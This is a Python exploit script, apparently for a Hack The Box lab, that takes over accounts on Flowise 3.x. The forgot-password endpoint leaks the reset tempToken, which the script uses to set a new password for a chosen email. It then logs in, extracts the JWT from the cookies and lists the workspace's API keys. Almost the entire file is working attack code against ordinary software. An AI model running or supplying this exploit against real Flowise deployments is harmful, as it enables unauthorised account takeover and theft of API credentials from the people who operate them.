#!/usr/bin/env python3
"""
Silentium / Flowise 3.x — password reset via forgot-password tempToken.

Usage (lab only):
  python3 flowise_account_takeover.py --base http://staging.silentium.htb \\
      --email ben@silentium.htb --new-password 'ChangeMe123!'

Prints reset result, login cookies hint, and API key list when workspace headers work.
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.request


def req(method: str, url: str, data: dict | None = None, headers: dict | None = None, cookies: str = ""):
    body = None if data is None else json.dumps(data).encode()
    h = {"Content-Type": "application/json", "Accept": "application/json"}
    if headers:
        h.update(headers)
    if cookies:
        h["Cookie"] = cookies
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            raw = resp.read().decode()
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()


def main() -> int:
    p = argparse.ArgumentParser(description="Flowise forgot-password takeover (HTB lab)")
    p.add_argument("--base", required=True, help="e.g. http://staging.silentium.htb")
    p.add_argument("--email", required=True)
    p.add_argument("--new-password", required=True)
    p.add_argument("--skip-reset", action="store_true", help="only try login with --new-password")
    args = p.parse_args()
    base = args.base.rstrip("/")

    if not args.skip_reset:
        code, _, raw = req(
            "POST",
            f"{base}/api/v1/account/forgot-password",
            {"user": {"email": args.email}},
        )
        print(f"[*] forgot-password → {code}")
        print(raw[:500])
        if code != 201:
            print("[-] expected 201 with tempToken", file=sys.stderr)
            return 1
        data = json.loads(raw)
        token = data["user"]["tempToken"]
        code, _, raw = req(
            "POST",
            f"{base}/api/v1/account/reset-password",
            {
                "user": {
                    "email": args.email,
                    "tempToken": token,
                    "password": args.new_password,
                }
            },
        )
        print(f"[*] reset-password → {code}")
        print(raw[:300])

    code, headers, raw = req(
        "POST",
        f"{base}/api/v1/auth/login",
        {"email": args.email, "password": args.new_password},
    )
    print(f"[*] login → {code}")
    print(raw[:400])
    set_cookie = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
    # urllib may not merge multiple Set-Cookie; still show Authorization path
    try:
        user = json.loads(raw)
    except json.JSONDecodeError:
        return 1
    print("[+] login body keys:", list(user.keys()))
    ws = user.get("activeWorkspaceId")
    print("[+] activeWorkspaceId:", ws)

    # JWT often in Set-Cookie: token=...
    jwt = None
    if "token=" in set_cookie:
        for part in set_cookie.split(","):
            if "token=" in part:
                jwt = part.split("token=")[1].split(";")[0].strip()
                break
    if not jwt:
        print("[!] Parse JWT from browser cookies (name=token) if API calls 401")
        return 0

    cookie_hdr = f"token={jwt}"
    code, _, raw = req(
        "GET",
        f"{base}/api/v1/apikey",
        headers={
            "Authorization": f"Bearer {jwt}",
            "x-request-from": "internal",
            "workspaceid": str(ws or ""),
        },
        cookies=cookie_hdr,
    )
    print(f"[*] apikey → {code}")
    print(raw[:600])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
